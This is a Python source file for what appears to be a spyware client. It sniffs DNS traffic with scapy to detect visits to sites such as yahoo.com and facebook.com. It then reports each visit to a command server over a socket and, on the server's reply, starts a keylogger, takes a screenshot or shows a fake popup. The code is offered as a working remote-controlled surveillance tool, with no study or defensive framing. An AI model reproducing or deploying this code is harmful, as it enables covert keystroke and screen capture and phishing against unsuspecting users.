import time
from scapy.all import *
import socket
import keylogger
import screenshot
import popup

HOST = '127.0.0.1'
PORT = 65432
c = socket.socket()
c.connect((HOST, PORT))

# List of websites to monitor
websites = ["example.com", "yahoo.com", "facebook.com"]

# Dictionary to keep track of which websites are open
site_status = {site: False for site in websites}

# Global variable for storing the server's choice
choice = None


# Function to trigger when the site is opened
def site_opened(site):
    global choice
    print(f"[{time.ctime()}] {site} is opened! Triggering action...")
    c.send(b"Hello server! " + site.encode() + b" is opened. What do you want to do?\n1. Activate keylogger\n2. Take screenshot\n3. Fake popup\n")

    # Wait for server input (synchronous)
    choice = c.recv(1024).decode()
    print(f"Choice received from server: {choice}")

    if choice == "1":
        print("Activating keylogger")
        keylogger.keylogger()
        c.send(b"Function Implemented\n")
    elif choice == "2":
        screenshot.take_screenshot()
        print("Screenshot saved as screenshot.png")
    elif choice == "3":
        popup.fakepopup()

# Function to handle DNS packet sniffing
def packet_callback(pkt):
    # Check if the packet is a DNS response (query/answer)
    if pkt.haslayer(DNS):
        # Handle DNS Response (qr == 1 means it's a response)
        if pkt[DNS].qr == 1:
            for site in websites:
                try:
                    # Check if the DNS response is for one of the websites
                    if site in pkt[DNS].an.rdata.decode('utf-8', errors='ignore'):
                        if not site_status[site]:
                            site_status[site] = True
                            site_opened(site)  # Trigger when the site is accessed
                except Exception as e:
                    # print(f"Error handling DNS response: {e}")
                    continue

        # Handle DNS Request (qr == 0 means it's a request)
        elif pkt[DNS].qr == 0:
            for site in websites:
                try:
                    if site in pkt[DNS].qd.qname.decode('utf-8', errors='ignore'):
                        if not site_status[site]:
                            site_status[site] = True
                            site_opened(site)  # Trigger when the site is accessed
                except Exception as e:
                    # print(f"Error handling DNS request: {e}")
                    continue


# Start DNS sniffing and continuous checking
def start_sniffing():
    print("Monitoring DNS traffic in real time...")
    sniff(prn=packet_callback, filter="udp port 53", store=0)


# Main loop: keeps checking for DNS traffic and server commands
if __name__ == "__main__":
    start_sniffing()
